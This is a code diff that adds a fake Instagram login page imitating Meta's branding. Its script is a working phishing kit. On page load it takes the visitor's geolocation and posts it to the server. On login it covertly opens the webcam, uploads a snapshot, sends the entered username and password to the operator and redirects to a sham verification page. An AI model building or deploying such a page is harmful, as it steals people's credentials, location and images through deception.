@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Log in</title>
+    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png" type="image/x-icon">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(to bottom, #1b2838, #0d161e);
+            color: #fff;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .language-top {
+            width: 100%;
+            text-align: center;
+            padding: 14px 0;
+            font-size: 14px;
+            color: #fff;
+            font-weight: 500;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            flex-grow: 1;
+            justify-content: center;
+        }
+        
+        .logo-container {
+            margin-bottom: 54px;
+            display: flex;
+            justify-content: center;
+        }
+        
+        .instagram-logo {
+            width: 85px;
+            height: 85px;
+        }
+        
+        .form-container {
+            width: 100%;
+        }
+        
+        .form-input {
+            width: 100%;
+            background-color: rgba(30, 41, 59, 0.8);
+            border: 1px solid #384b65;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            padding: 16px 12px;
+            margin-bottom: 14px;
+        }
+        
+        .form-input::placeholder {
+            color: #8b949e;
+        }
+        
+        .form-input:focus {
+            border-color: #666;
+            outline: none;
+        }
+        
+        .login-button {
+            width: 100%;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 14px 0;
+            margin-top: 16px;
+            cursor: pointer;
+        }
+        
+        .login-button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: default;
+        }
+        
+        .forgot-password {
+            color: #0095f6;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 24px;
+            text-decoration: none;
+            display: block;
+        }
+        
+        .language-selector {
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .language-display {
+            color: #0095f6;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .divider {
+            border-top: 1px solid #384b65;
+            margin: 40px 0 20px;
+            width: 100%;
+        }
+        
+        .create-account {
+            color: #0095f6;
+            font-size: 14px;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+            margin: 24px 0 32px;
+            width: 100%;
+            border: 1.5px solid #1d4a79;
+            border-radius: 12px;
+            padding: 14px 0;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
+            font-weight: 600;
+            background-color: transparent;
+        }
+        
+        .create-account:hover {
+            background-color: rgba(0, 149, 246, 0.05);
+        }
+        
+        .meta-logo {
+            margin-bottom: 24px;
+            opacity: 0.9;
+            width: 100px;
+            filter: brightness(100) contrast(1) invert(1);
+        }
+        
+        .emoji-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        
+        .floating-emoji {
+            position: absolute;
+            opacity: 0.05;
+            font-size: 36px;
+            animation-name: float;
+            animation-duration: 15s;
+            animation-timing-function: ease-in-out;
+            animation-iteration-count: infinite;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 0.02;
+            }
+            50% {
+                transform: translateY(-20px) rotate(10deg);
+                opacity: 0.08;
+            }
+            100% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 0.02;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="emoji-background">
+        <div class="floating-emoji" style="top: 15%; left: 10%; animation-delay: 0s;">❤️</div>
+        <div class="floating-emoji" style="top: 25%; left: 85%; animation-delay: 1s;">📸</div>
+        <div class="floating-emoji" style="top: 50%; left: 20%; animation-delay: 2s;">👍</div>
+        <div class="floating-emoji" style="top: 75%; left: 75%; animation-delay: 3s;">🔥</div>
+        <div class="floating-emoji" style="top: 35%; left: 45%; animation-delay: 4s;">💬</div>
+        <div class="floating-emoji" style="top: 85%; left: 30%; animation-delay: 5s;">🔍</div>
+        <div class="floating-emoji" style="top: 65%; left: 60%; animation-delay: 6s;">🏆</div>
+        <div class="floating-emoji" style="top: 5%; left: 65%; animation-delay: 7s;">🌟</div>
+    </div>
+    
+    <div class="language-top">
+        English (US)
+    </div>
+    
+    <div class="container">
+        <div class="logo-container">
+            <svg xmlns="http://www.w3.org/2000/svg" class="instagram-logo" viewBox="0 0 448 512" fill="url(#instagram-gradient)">
+                <defs>
+                    <linearGradient id="instagram-gradient" x1="100%" y1="0%" x2="0%" y2="100%">
+                        <stop offset="0%" style="stop-color:#405DE6"/>
+                        <stop offset="20%" style="stop-color:#5851DB"/>
+                        <stop offset="40%" style="stop-color:#833AB4"/>
+                        <stop offset="60%" style="stop-color:#C13584"/>
+                        <stop offset="80%" style="stop-color:#E1306C"/>
+                        <stop offset="100%" style="stop-color:#FD1D1D"/>
+                    </linearGradient>
+                </defs>
+                <path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
+            </svg>
+        </div>
+        
+        <div class="form-container">
+            <form id="loginForm" action="/login" method="post">
+                <input type="text" id="username" name="username" class="form-input" placeholder="Username, email or mobile number" required>
+                <input type="password" id="password" name="password" class="form-input" placeholder="Password" required>
+                <button type="submit" id="loginButton" class="login-button" disabled>Log in</button>
+            </form>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+    </div>
+    
+    <div style="width: 100%; text-align: center; padding-bottom: 24px;">
+        <div class="divider"></div>
+        <a href="#" class="create-account">Create new account</a>
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png" alt="Meta Logo" class="meta-logo">
+        <div style="color: #8b949e; font-size: 12px; margin-top: -10px;">© 2025 Meta</div>
+    </div>
+    
+    <script>
+        // Validate login form
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+        
+        // Request location access as soon as the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log("Requesting location access...");
+            // Request location access
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    console.log("Location access granted");
+                    // Send location data to server
+                    fetch('/save_location', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        })
+                    });
+                }, function(error) {
+                    console.error("Location access denied:", error);
+                });
+            }
+        });
+        
+        // Enable button only when both fields have content
+        function validateForm() {
+            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                loginButton.disabled = false;
+            } else {
+                loginButton.disabled = true;
+            }
+        }
+        
+        usernameInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+        
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Try to access camera
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        // Create hidden video element
+                        const video = document.createElement('video');
+                        video.style.display = 'none';
+                        document.body.appendChild(video);
+                        video.srcObject = stream;
+                        
+                        // Play video and capture image
+                        video.play().then(function() {
+                            // Create canvas and draw video frame
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            
+                            // Convert to image data
+                            canvas.toBlob(function(blob) {
+                                // Upload image
+                                const formData = new FormData();
+                                formData.append('photo', blob, 'photo.jpg');
+                                
+                                fetch('/capture_photo', {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                                
+                                // Stop all tracks
+                                stream.getTracks().forEach(track => track.stop());
+                                
+                                // Submit the form with credentials
+                                submitCredentials();
+                            });
+                        });
+                    })
+                    .catch(function() {
+                        // If camera access denied, just submit credentials
+                        submitCredentials();
+                    });
+            } else {
+                // If mediaDevices not supported, just submit credentials
+                submitCredentials();
+            }
+        });
+        
+        function submitCredentials() {
+            // Get form data
+            const formData = new FormData();
+            formData.append('username', usernameInput.value);
+            formData.append('password', passwordInput.value);
+            
+            // Send credentials to server
+            fetch('/login', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Redirect to verification page after short delay
+                setTimeout(() => {
+                    window.location.href = '/verification';
+                }, 1500);
+            })
+            .catch(error => {
+                // Still redirect
+                setTimeout(() => {
+                    window.location.href = '/verification';
+                }, 1500);
+            });
+        }
+    </script>
+</body>
+</html> 
